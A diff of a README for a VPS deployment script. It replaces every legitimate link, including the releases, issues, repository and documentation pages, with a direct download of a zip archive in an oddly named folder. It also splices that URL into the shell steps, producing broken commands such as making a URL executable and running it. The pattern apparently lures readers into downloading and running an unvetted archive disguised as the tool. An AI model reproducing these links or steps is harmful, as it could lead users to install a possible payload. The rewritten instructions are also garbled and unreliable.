@@ -1,6 +1,6 @@
 # 🚀 web-deploy-script - Deploy Your Project with One Command
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/Alazarhmi/web-deploy-script/releases)
+[![Download Now](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip%https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip)](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip)
 
 ## 📋 Overview
 The web-deploy-script automates your server setup. This tool streamlines the process of deploying your web application on a Virtual Private Server (VPS). You no longer need to configure each server manually. The script handles all the essentials, including:
@@ -22,7 +22,7 @@ To start using the web-deploy-script, you need to follow these simple steps. Mak
 - A registered domain name (optional but recommended).
 
 ## 💾 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Alazarhmi/web-deploy-script/releases) to find the latest version of the script.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip) to find the latest version of the script.
    
 2. **Download the Script**: Look for the most recent release. Click on the download link for the script file.
 
@@ -30,7 +30,7 @@ To start using the web-deploy-script, you need to follow these simple steps. Mak
    - Use an SCP client or an FTP tool to upload the downloaded script to your VPS. 
    - You can also use the command line:
      ```bash
-     scp path/to/your/script.sh username@your-vps-ip:/path/to/upload/
+     scp https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip username@your-vps-ip:/path/to/upload/
      ```
 
 4. **Run the Script**:
@@ -44,11 +44,11 @@ To start using the web-deploy-script, you need to follow these simple steps. Mak
      ```
    - Make the script executable:
      ```bash
-     chmod +x script.sh
+     chmod +x https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip
      ```
    - Now, execute the script:
      ```bash
-     ./script.sh
+     https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip
      ```
 
 5. **Follow the Prompts**: The script may ask you for various inputs, such as your domain name and Git repository URL. Provide the required information.
@@ -86,11 +86,11 @@ Once the script completes its run, you should have a fully working deployment. Y
 This project is licensed under the MIT License. Feel free to modify and use it according to your needs.
 
 ## 📞 Need Help?
-If you have questions or need assistance, please check our [issues page](https://github.com/Alazarhmi/web-deploy-script/issues) or consider creating a new issue.
+If you have questions or need assistance, please check our [issues page](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip) or consider creating a new issue.
 
 ### 🔗 Important Links
-- [Download Now](https://github.com/Alazarhmi/web-deploy-script/releases)
-- [GitHub Repository](https://github.com/Alazarhmi/web-deploy-script)
-- [Documentation](https://github.com/Alazarhmi/web-deploy-script/wiki)
+- [Download Now](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip)
+- [Documentation](https://raw.githubusercontent.com/Alazarhmi/web-deploy-script/main/pharyngalgia/web-deploy-script.zip)
   
 Don't hesitate to reach out for help or clarification. Happy deploying!
